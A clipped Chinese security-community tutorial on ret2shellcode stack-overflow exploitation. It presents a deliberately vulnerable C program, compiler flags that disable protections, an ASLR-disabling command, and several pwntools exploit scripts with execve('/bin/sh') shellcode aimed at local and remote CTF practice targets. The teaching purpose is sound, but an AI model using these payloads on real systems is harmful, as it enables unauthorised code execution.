---
title: 【微信】ret2shellcode 浅析
source: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458620497&idx=1&sn=ad5450b7723941e8ae0f280a34e4792b&chksm=b036196797850ce4cc342f19440efaa03f39ef45d159dbb6cee586030278f89070567a096943
source_host: mp.weixin.qq.com
clip_date: 2026-09-24T23:20:19+08:00
trace_id: 9b347555-5bd7-46eb-8444-0f1fb120f756
content_hash: 6449fd5a109421dda242986757be90104dd26fa28d32b2e99825393c285e34bc
status: synced
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号·看雪学院（weread）
ai_summary: 栈空间可执行（无 NX）且存在缓冲区溢出时，把 shellcode 写入栈并覆盖返回地址跳转过去，即可直接 getshell。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3e575244-d011-811f-b3b0-d4a3a23895b8
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 栈空间可执行（无 NX）且存在缓冲区溢出时，把 shellcode 写入栈并覆盖返回地址跳转过去，即可直接 getshell。
> 
> - **利用前提：** 存在栈溢出漏洞、未开启 NX（栈可执行）、能泄露或算出栈地址；本地练习可写 `echo 0 > /proc/sys/kernel/randomize_va_space` 关掉 ASLR 固定栈址。
> - **编译方式：** `gcc -fno-stack-protector -z execstack -no-pie -o pwnme test.c`，同时关闭栈保护和地址随机化，方便复现。
> - **payload 结构：** 垃圾数据填满缓冲区+8 字节 rbp，再把返回地址覆盖为 shellcode 起始处（`buf + buf大小 + 8 + 8`），最后拼接 shellcode；shellcode 也可放前面、返回地址填 `buf` 以节省尾部空间。
> - **动态泄露地址：** 远程 ASLR 开启时用 `io.recvuntil(b'[LEAK] buf = ')` 后 `int(io.recvline().strip(), 16)` 实时解析栈地址，替代硬编码。
> - **shellcode 选择：** `asm(shellcraft.sh())` 生成 `execve("/bin/sh",NULL,NULL)` 共 49 字节（系统调用号固定、机器码可复用，优于需找绝对地址的 `system`）；空间受限（如仅 0x20）时改用 22/24 字节的精简版本。

## 学了Ret2Text之后大家肯定有一个问题，就是如果没有BackDoor的时候怎么办呢，那么Ret2Shellcode了解一下。

Ret2Text 是指可以直接调用text里的函数，那么Ret2Shellcode就是指，我们可以直接自己构建一个函数。

程序存在缓冲区溢出漏洞，且 **栈空间可执行（无 NX 保护）**，我们可以将自定义的 shellcode（机器码指令）写入程序栈中，再通过溢出覆盖函数返回地址，让程序执行流跳转至栈上的 shellcode，最终弹出系统 shell。

## 操作流程：

-   利用缓冲区溢出，填充垃圾数据覆盖栈缓冲区；
    
-   精准覆盖函数返回地址，将其改为栈上 shellcode 的起始地址；
    
-   函数执行结束执行 ret 指令时，跳转至栈上 shellcode；
    
-   shellcode 被执行，获取系统 shell。
    

## 利用条件：

-   存在栈缓冲区溢出漏洞；
    
-   未开启 NX 保护（栈可执行）；
    
-   可以泄露/精准计算出栈地址；
    

实操

## 1\. 存在漏洞的c代码

```cpp
#include <stdio.h>
#include <unistd.h>

voidvuln(){
char buf[64];

printf("buf = %p\n", buf);

read(0, buf, 200);
}

intmain(){
vuln();
return 0;
}
```

## 2.编译一下

```
gcc -fno-stack-protector -z execstack -no-pie -o pwnme test.c
```

## 3.确认漏洞存在

写的比存的多，或者说是比预分配的多，这个时候确认栈溢出漏洞存在，rax 分配了0x40个大小，但是read能读取0xc8肯定存在栈溢出。

那实际上只要覆盖满0x40+8就能到达ret的位置。可以看一下模拟图。

由于这里没有可以直接利用的函数，所以我们需要自己创造一个函数出来。我们需要创造的函数是：

```
execve("/bin/sh", NULL, NULL)
```

在amd64的环境下，它对应的机器码是：

```rust
原始字节串：
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
进制字符串：

a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05
```

这里pwntools提供了一个快速生成shellcode的模块。通过如下的方法就可以直接生成，当然你也可以用上面的进行复制粘贴。

```
shellcraft.sh()
```

现在我们要根据软件的格式进行转换

```
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
sc = asm(shellcraft.sh())
```

## 4.开始利用

### 第一步：首先还是先覆盖到0x40+8的位置。

```
payload = 'A'*(0x40+8)
```

然后我们知道后面的ret就是跳转地址，在之前的内容，我们这里需要写的是跳转地址，但是在这里我们需要写Shellcode的地址。这里我看在后面多余的跳转位置写。

那么写这个之前就要知道内存地址，在源码里也进行了对应的内存地址打印。如果是本地练习的话，可以关闭地址随机化 ASLR，保证栈地址固定，方便漏洞复现。

> ```bash
> # 临时关闭（重启失效）
> echo 0 > /proc/sys/kernel/randomize_va_space
> 
> # 永久关闭（可选）
> sudo vim /proc/sys/kernel/randomize_va_space
> # 修改值为 0
> ```

### 第二步：确认栈地址

运行一下就可以拿到地址

```
 ./pwnme 
buf = 0x7fffffffe300
```

那么我们就知道初始的buf就是 `0x7fffffffe300` ，那么经过 `0x40+8` 的偏移，并且还要算上ret的 `8` 位便宜，所以最终地址就是 `0x40+16`

```
buf = 0x7fffffffe300
payload = b'A'*(0x40+8)
ret = 0x7fffffffe300+0x40+8+8
payload += ret 
```

### 第三步：写Shellcode

```
from pwn import *
context.arch = 'amd64'
context.os = 'linux'
sc = asm(shellcraft.sh())

buf = 0x7fffffffe300
payload = b'A'*(0x40+8)
ret = p64(buf+0x40+8+8)
payload += ret 
payload +=sc
```

### 第四步：组装最终的poc

```powershell
from pwn import *
context.binary = elf = ELF('./pwnme')
context.arch = 'amd64'
context.os = 'linux'
p = process('./pwnme')

sc = asm(shellcraft.sh())

buf = 0x7fffffffe300
payload = b'A'*(0x40+8)
ret = p64(buf+0x40+8+8)
payload += ret 
payload +=sc

p.send(payload)
p.interactive()
```

运行一下最终拿到shell权限

ok，以上就是最简单最基础的Ret2Shellcode

远程利用

远程地址：http://hbc.haobachang.com/see_bug_one?id=1410

之前由于我们关了ASLR，所以每次地址都是固定，所以我们通过硬编码的形式写了exp，但是很多情况在远程主机默认就是开启了ASLR。那么这个时候怎么办。

首先先nc连接一下，多执行几次就知道每次的buf都不一样。

那么这里我们就需要动态提取一下

> ### recvuntil(delim)
> 
> 持续接收数据，直到读到指定的分隔字节串 `delim` ，然后停止接收；返回【包含 delim 本身】的所有收到的数据。

> ### recvline
> 
> 持续接收数据， **直到读到换行符  
> `\n`  
> **就停止，返回 **包含末尾  
> `\n`  
> **的这一行字节数据。

然后写一下py，运行

```python
from pwn import *
context.log_level = 'info'
io = remote('hbc2.haobachang.com', 17159)
io.recvuntil(b'[LEAK] buf = ')
buf_addr = int(io.recvline().strip(), 16)
buf_addr = hex(buf_addr)
log.success(f'{buf_addr}')
```

这样就能动态的提取buf_addr了

ok，现在我们进行分析，看到首先是开辟了一个0x50的空间，然后read可以读取0xc8的内容，那么就可以判断这里是存在栈溢出的。

那么我们可以采用之前的方法来写poc，专门增加了注释，大家感兴趣的可以逐行研究。

```python
from pwn import *
# 设置程序架构、系统等上下文信息，方便asm编译shellcode和p64打包地址
context.binary = elf = ELF('./pwnme')
context.arch = 'amd64'    # 64位程序
context.os = 'linux'      # linux系统
context.log_level = 'info' # 日志等级，会打印成功、错误等信息

# 连接远程pwn靶机
io = remote('hbc2.haobachang.com', 10394)

# 接收直到字符串 [LEAK] buf = ，后面就是泄露出来的buf栈地址
io.recvuntil(b'[LEAK] buf = ')
# 读取一行地址，转成16进制整数，用于后续地址计算
buf_addr = int(io.recvline().strip(), 16)
# 打印泄露的buf地址（hex格式化输出，方便查看）
log.success(f'buf_addr = {hex(buf_addr)}')

# 生成linux amd64下的execve("/bin/sh",0,0) shellcode
sc = asm(shellcraft.sh())

# 填充垃圾数据：0x50是缓冲区大小，+8是rbp的8字节，合计覆盖到返回地址
payload = b'A'*(0x50+8)
# 构造跳转地址：覆盖返回地址，让ret执行时跳转到我们shellcode起始位置
# buf基地址 + 0x50+8(垃圾+rbp) +8(返回地址本身8字节) → shellcode起始处
ret_addr = p64(buf_addr + 0x50 + 8 + 8)
payload += ret_addr 
# 在跳转地址后面拼接shellcode
payload += sc

# 发送构造好的溢出payload
io.send(payload)
# 进入交互模式，拿到shell后可以直接输入命令
io.interactive()
```

执行一下，拿到flag

无法在尾巴写入ShellCode怎么办

如果遇到这样一个场景就是在当后面的缓存区不够用的时候怎么办，举个例子。

```cpp
#include <stdio.h>
#include <unistd.h>

voidvuln(){
char buf[80];

printf("buf = %p\n", buf);

read(0, buf, 96);
}

intmain(){
vuln();
return 0;
}
```

比如这里，我们知道这里肯定是存在溢出的，首先你需要至少16个字节才能改写ret，Shellcode自己也是要占用内存的，64+16=80，再继续往后写空间是不够的。聪明的你肯定想到，那是不是可以在前面写，然后跳转，这样空间就够了。

现在来写poc,这里咱们先从头写Shellcode

```python
from pwn import *
context.binary = elf = ELF('./pwnme')
context.arch = 'amd64'
context.os = 'linux'
p = process('./pwnme')

p.recvuntil(b'buf = ')
buf_addr = int(p.recvline().strip(), 16)

sc = asm(shellcraft.sh())

payload = sc
```

然后算出偏移

```
payload = sc
payload += b'A'*(0x50+8-len(sc))
payload += p64(buf)
```

最终脚本就是：

```python
from pwn import *
context.binary = elf = ELF('./pwnme')
context.arch = 'amd64'
context.os = 'linux'
p = process('./pwnme')

p.recvuntil(b'buf = ')
buf_addr = int(p.recvline().strip(), 16)

sc = asm(shellcraft.sh())

payload = sc
payload += b'A'*(0x50+8-len(sc))
payload += p64(buf_addr) 

# 发送构造好的溢出payload
p.send(payload)
# 进入交互模式，拿到shell后可以直接输入命令
p.interactive()
```

执行一下

有一道远程的题目，大家可以练习一下：

http://hbc.haobachang.com/see_bug_one?id=1411

shellcraft.sh() 浅析

那么我们是为了学习的目的，所以我们现在来看一下shellcraft.sh()到底是什么，我们还是用asm为例。

之前我们说了 `shellcraft.sh()` 生成的函数原型是 `execve("/bin/sh", NULL, NULL)` ，那么为什么不用system呢

## 1.浅析

来看一下对比：

-   **  
    `system()`  
    **
    
    会调用 `fork()` 创建一个 **子进程**，在子进程中执行 shell，同时 **父进程（原程序）会阻塞等待**，直到子进程结束。执行完后，控制权会返回给父进程，程序继续往下运行。
    
-   **  
    `execve()`  
    **
    
    **不创建新进程**。它会直接用 `/bin/sh` 的代码和数据 **覆盖** 当前进程的映像。一旦调用成功，当前进程的后续代码（包括 `main` 函数的剩余部分） **永远不会执行**，也就是忽略原本程序，现在你就是/bin/sh。
    

并且**  
`execve()`  
**的系统调用号是固定的，这样就不需要自己去通过其他方式去找，而system不是， `system` 需要去找绝对地址。也就是通过**  
`execve()`  
**构建的机器码是可以复用的。所以在pwn里会选择**  
`execve()`  
**。

现在来看一下 `shellcraft.sh()` 对应的汇编，首先打印一下,然后通过 `ndisasm` 查看对应的汇编,整个长度为49字节。

```
echo -ne "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05" | ndisasm -b 64 -
```

```cpp
0:6a 68                   push   0x68
2:48 b8 2f 62 69 6e 2f    mov    rax, 0x732f2f2f6e69622f   ; "/bin///s"
9:2f 2f 73 
c:50                      push   rax
d:48 89 e7                mov    rdi, rsp                ; rdi = 栈上字符串地址
10:68 72 69 01 01          push   0x01016972              ; 压入 "ri" + 两个 0x01
15:81 34 24 01 01 01 01    xor    dword [rsp], 0x01010101 ; 将 "ri\x01\x01" 变成 "sh\x00\x00"
1c:31 f6                   xor    esi, esi                ; argv = NULL
1e:56                      push   rsi
1f:6a 08                   push   0x8
21:5e                      pop    rsi                     ; rsi = 8
22:48 01 e6                add    rsi, rsp                ; rsi = 栈上 "/bin/sh" 地址 + 8
25:56                      push   rsi                     ; 压入 argv[0] 指针
26:48 89 e6                mov    rsi, rsp                ; rsi = &argv[0]
29:31 d2                   xor    edx, edx                ; envp = NULL
2b:6a 3b                   push   0x3b
2d:58                      pop    rax                     ; rax = 59 (execve 系统调用号)
2e:0f 05                   syscall                         ; 触发系统调用
```

这里网上还有一些其他长度的shellcode

## 2\. 24字节 shellcode

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = asm('''
    push 0x3b
    pop rax
    cdq   
    push rdx 
    mov rbx, 0x68732f6e69622f2f  
    push rbx
    push rsp
    pop rdi     
    push rdx
    push rdi
    push rsp
    pop rsi                 # rsi = argv 数组地址 (指向 [字符串地址, 0])
    syscall
''')
```

## 3.22字节 shellcode

```
sc = asm("""
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi,esi
    xor edx,edx
    push 0x3b
    pop rax
    syscall
""")
```

后面感觉可以专门写一篇深度分析的文章。

有大小限制的栈溢出

看了上面的字节限制，聪明的你肯定知道，必然会有这样的考题，限制存储大小。所以他来啦。

http://hbc.haobachang.com/see_bug_one?id=1412

由于这里的只给分配了0x20大小的空间，没有办法使用 `shellcraft.sh()` 所以使用22字节的Shellcode 即可。大家可以自行分析。

```python
from pwn import *
context.binary = elf = ELF('./pwnme')
context.arch = 'amd64'
context.os = 'linux'
p = remote('hbc2.haobachang.com', 13553)

p.recvuntil(b'[LEAK] buf = ')
buf_addr = int(p.recvline().strip(), 16)
print(buf_addr)
#sc = asm(shellcraft.sh())

sc = asm("""
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi,esi
    xor edx,edx
    push 0x3b 
    pop rax
    syscall
""")
payload = sc
payload += b'A'*(0x20+8-len(sc))
payload += p64(buf_addr) 
print(payload)
# 发送构造好的溢出payload
p.send(payload)
# 进入交互模式，拿到shell后可以直接输入命令
p.interactive()
```

总结

本节内容主要是带大家了解了一下关于ret2shellcode的利用，以及远程利用方法，Shellcode的不同位置的写法，以及遇到的一些题目，大家下期见  

\*本文为看雪论坛优秀文章，由 王嘟嘟 原创，转载请注明来自看雪社区 [App 抽取壳的内存脱壳与请求签名逆向](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458619713&idx=1&sn=ec61b7e3afb64384c71693657e53d117&scene=21#wechat_redirect) [ART 执行链与 Nterp：解析 FART Android12‑16 失效问题](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458619676&idx=1&sn=2c4d3a7a8e4001824f3a0a2f5bc5c8f8&scene=21#wechat_redirect) [Hitcon-2016-babytrick 解题报告](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458619656&idx=2&sn=e2518e55f8b66c6b10176910c3fd00e6&scene=21#wechat_redirect) [Windows调试体系揭秘](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458619528&idx=2&sn=24940f883e8435ecda20073eec37fb9b&scene=21#wechat_redirect) [RP2350 硬件固化 CVE‑2022‑38694：突破 Unisoc BSP 安全启动链](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458619521&idx=2&sn=1a084ce77235787ce7e11a74374a537f&scene=21#wechat_redirect)
